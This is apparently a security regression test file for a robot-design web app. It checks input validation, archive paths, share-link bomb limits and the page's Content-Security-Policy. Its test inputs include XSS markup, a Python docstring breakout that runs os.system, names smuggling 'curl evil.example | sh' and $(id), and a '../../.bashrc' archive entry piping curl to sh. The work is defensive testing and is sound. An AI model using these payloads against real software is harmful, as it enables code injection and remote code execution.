// Security regressions (docs/SECURITY_AUDIT.md): hostile names and keys in robots, share-link bombs, unsafe archive
// paths, the page's Content-Security-Policy and the HTML sinks it forbids. scripts/check_xss.py drives the same payloads
// through the real page in Chromium.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { finalizeSpec } from "@ttr/robot-generator";
import { validateSpec } from "@ttr/robot-schema";
import { interpretPrompt } from "@ttr/robot-generator";
// @ts-expect-error: plain JavaScript modules without types
import { safeJsonParse, inflateCapped, safeZipPath, safeFileName, safeHttpUrl, MAX_PROMPT_CHARS } from "../apps/web/public/safe.js";
// @ts-expect-error: plain JavaScript module without types
import { makeZip } from "../apps/web/public/robotkit.js";
import { policy, withPolicy } from "../scripts/csp.ts";

const XSS = `"><img src=x onerror="globalThis.__xss=1"><svg onload=alert(1)>`;
const example = () => JSON.parse(readFileSync("examples/01_arm_2dof/robot.json", "utf8"));
const errors = (spec: unknown) => validateSpec(finalizeSpec(structuredClone(spec) as never)).issues.filter((i) => i.severity === "error").map((i) => i.code);

test("names that would break out of generated files or the page are refused", () => {
  const cases: [string, (s: any) => void, string][] = [
    ["robot name with markup", (s) => { s.robot_name = XSS; }, "bad_robot_name"],
    ["robot name closing a Python docstring", (s) => { s.robot_name = 'x"""\nimport os; os.system("id")\n"""'; }, "bad_robot_name"],
    ["robot name with ../", (s) => { s.robot_name = "../../etc/x"; }, "bad_robot_name"],
    ["robot name with a shell command", (s) => { s.robot_name = "arm; curl evil.example | sh"; }, "bad_robot_name"],
    ["joint name", (s) => { s.joints[0].name = `j"$(id)`; }, "bad_joint_name"],
    ["material name", (s) => { s.materials[0].name = "<b>"; }, "bad_material_name"],
    ["link material reference", (s) => { s.links[0].material = "x' onload='y"; }, "bad_material_name"],
    ["link name", (s) => { s.links[0].name = "a b"; }, "bad_link_name"],
  ];
  for (const [what, mutate, code] of cases) { const s = example(); mutate(s); assert.ok(errors(s).includes(code), `${what}: ${errors(s)}`); }
  assert.deepEqual(errors(example()), [], "the shipped example stays valid");
});

test("JSON from files and links cannot reach an object's prototype", () => {
  const text = `{"robot_name":"a","__proto__":{"polluted":1},"links":[{"constructor":{"prototype":{"polluted":2}}}],"metadata":{"prototype":3}}`;
  const v = safeJsonParse(text);
  assert.equal(({} as any).polluted, undefined);
  assert.equal(Object.getPrototypeOf(v), Object.prototype);
  assert.ok(!Object.hasOwn(v, "__proto__") && !Object.hasOwn(v.links[0], "constructor") && !Object.hasOwn(v.metadata, "prototype"));
  assert.equal(structuredClone(v).polluted, undefined);
  assert.throws(() => safeJsonParse("[" + "1,".repeat(100) + "1]", 50), /larger than/);
});

test("a share link that unpacks to gigabytes stops at the cap", async () => {
  // 64 MB of zeros compresses to about 64 KB: the shape of a deflate bomb in a #robot= link
  const bomb = new Uint8Array(await new Response(new Blob([new Uint8Array(64 * 1024 * 1024)]).stream().pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
  assert.ok(bomb.length < 200_000);
  const t = performance.now();
  await assert.rejects(inflateCapped(bomb, "deflate-raw", 8 * 1024 * 1024), /larger than 8 MB/);
  assert.ok(performance.now() - t < 5000);
  const small = new Uint8Array(await new Response(new Blob([new TextEncoder().encode('{"a":1}')]).stream().pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
  assert.deepEqual(safeJsonParse(new TextDecoder().decode(await inflateCapped(small))), { a: 1 });
});

test("archives never hold paths that leave their folder; download names have no folders", async () => {
  for (const bad of ["../evil.sh", "a/../../evil", "..\\..\\evil.bat", "C:/Windows/x", "a/\u0000b", ".."]) assert.throws(() => safeZipPath(bad), /unsafe file path/, bad);
  assert.equal(safeZipPath("/abs/x.txt"), "abs/x.txt");
  assert.equal(safeZipPath("pkg\\urdf\\./r.urdf"), "pkg/urdf/r.urdf");
  assert.throws(() => makeZip({ "../../.bashrc": "curl evil | sh" }), /unsafe file path/);
  const zip = new Uint8Array(await (makeZip({ "pkg/a.txt": "x" }) as Blob).arrayBuffer());
  assert.ok(new TextDecoder().decode(zip).includes("pkg/a.txt"));
  for (const n of ["../../x/y.urdf", "..\\..\\x.bat", "/etc/passwd", ".bashrc"]) { const f = safeFileName(n); assert.ok(!/[/\\]/.test(f) && !f.startsWith("."), `${n} -> ${f}`); }
  assert.equal(safeFileName('a<b>:"c|?*.json'), "a_b_c_.json");
  assert.equal(safeFileName("CON"), "robot");
  assert.equal(safeHttpUrl("javascript:alert(1)"), null);
  assert.equal(safeHttpUrl("java\tscript:alert(1)"), null);
  assert.equal(safeHttpUrl("https://example.com/a"), "https://example.com/a");
});

test("the prompt parser stays fast on hostile text up to the prompt limit", () => {
  // the first call loads the CAD kernels and designs the arm (seconds); a design takes about 1.5 s whatever the text, and
  // catastrophic regex backtracking would take minutes, so the bound is loose on purpose
  interpretPrompt("arm arm");
  for (const p of ["arm ".repeat(MAX_PROMPT_CHARS / 4), "6 dof ".repeat(MAX_PROMPT_CHARS / 6), "(".repeat(MAX_PROMPT_CHARS), "1.".repeat(MAX_PROMPT_CHARS / 2), " ".repeat(MAX_PROMPT_CHARS) + "x", `${XSS} `.repeat(MAX_PROMPT_CHARS / XSS.length)]) {
    const t = performance.now(); try { interpretPrompt(p); } catch { /* refusing is fine */ }
    assert.ok(performance.now() - t < 10000, `${p.slice(0, 12)}... took ${Math.round(performance.now() - t)} ms`);
  }
});

test("the page carries a current, strict Content-Security-Policy", () => {
  const file = "apps/web/public/index.html", html = readFileSync(file, "utf8");
  const r = spawnSync(process.execPath, ["scripts/csp.ts", "--check", file], { encoding: "utf8" });
  assert.equal(r.status, 0, r.stderr);
  const csp = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)![1];
  for (const d of ["default-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "require-trusted-types-for 'script'", "style-src 'self'", "worker-src 'self'"]) assert.ok(csp.includes(d), d);
  assert.ok(!/unsafe-inline|unsafe-eval|\*/.test(csp), csp);
  assert.ok(/<meta name="referrer" content="strict-origin-when-cross-origin" \/>/.test(html));
  // the policy comes first in <head>, before anything it governs
  assert.ok(html.indexOf("Content-Security-Policy") < html.indexOf("<link") && html.indexOf("Content-Security-Policy") < html.indexOf("<script"));
  // community origins are added from community.json only when set
  const withApi = policy(html, { api: "https://ttr-community.example.workers.dev", turnstile: true });
  assert.ok(/connect-src [^;]*https:\/\/ttr-community\.example\.workers\.dev/.test(withApi) && /frame-src https:\/\/challenges\.cloudflare\.com/.test(withApi));
  assert.equal(withPolicy(html, { api: null, turnstile: false }), html);
});

test("no HTML string sinks, inline handlers, inline styles or eval in the web app", () => {
  const dir = "apps/web/public", files = readdirSync(dir).filter((f) => /\.(js|html)$/.test(f));
  for (const f of files) {
    const src = readFileSync(`${dir}/${f}`, "utf8");
    for (const [what, re] of [["innerHTML", /\.(inner|outer)HTML\s*=/], ["insertAdjacentHTML", /insertAdjacentHTML/], ["document.write", /document\.write/], ["eval", /\beval\(|new Function\(/], ["srcdoc", /srcdoc/], ["javascript: URL", /["'`]javascript:/i]] as const)
      assert.ok(!re.test(src), `${f}: ${what}`);
    if (f.endsWith(".html")) {
      assert.ok(!/\son[a-z]+\s*=/i.test(src), `${f}: inline event handler`);
      assert.ok(!/\sstyle\s*=/.test(src), `${f}: inline style attribute`);
      assert.ok(!/(src|href)="http:\/\//.test(src), `${f}: plain-http link`);
      // every inline <script> is the import map (hashed in the CSP); scripts are files
      for (const m of src.matchAll(/<script([^>]*)>/g)) assert.ok(/type="importmap"|src="/.test(m[1]), `${f}: inline script ${m[0]}`);
    }
  }
});
